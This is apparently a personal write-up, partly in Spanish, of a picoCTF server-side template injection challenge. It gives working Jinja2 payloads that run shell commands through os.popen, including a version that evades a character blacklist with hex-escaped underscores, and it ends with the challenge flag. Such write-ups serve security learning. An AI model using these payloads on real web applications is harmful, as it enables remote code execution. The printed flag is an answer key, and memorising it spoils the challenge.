#### Description

I made a cool website where you can announce whatever you want! I read about input sanitization, so now I remove any kind of characters that could be a problem :)

Additional details will be available after launching your challenge instance.
¡Creé una página web genial donde puedes anunciar lo que quieras! Leí sobre la limpieza de entradas, así que ahora elimino cualquier carácter que pueda ser problemático :)

Habrá detalles adicionales disponibles después de lanzar su instancia de desafío.
#### Consejos:
1.  Server Side Template Injection
2.  Why is blacklisting characters a bad idea to sanitize input?
   
  http://shape-facility.picoctf.net:57962/
  * Se intento como el primero, con la página https://www.onsecurity.io/blog/server-side-template-injection-with-jinja2/
    Con estos de aquí:
    ![[Pasted image 20250415191357.png]]
    
* `{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}`
   ![[Pasted image 20250415190807.png]]
* `{{request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')|attr('popen')('==id==')|attr('read')()}}`
   ![[Pasted image 20250415190935.png]]

* Cambiamos `id` por `cat flag`
  ![[Pasted image 20250415191144.png]]
* `{{request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')|attr('popen')(=='cat flag==')|attr('read')()}}`
## Solución:
```
# picoCTF{sst1_f1lt3r_byp4ss_5b0b2f79}
```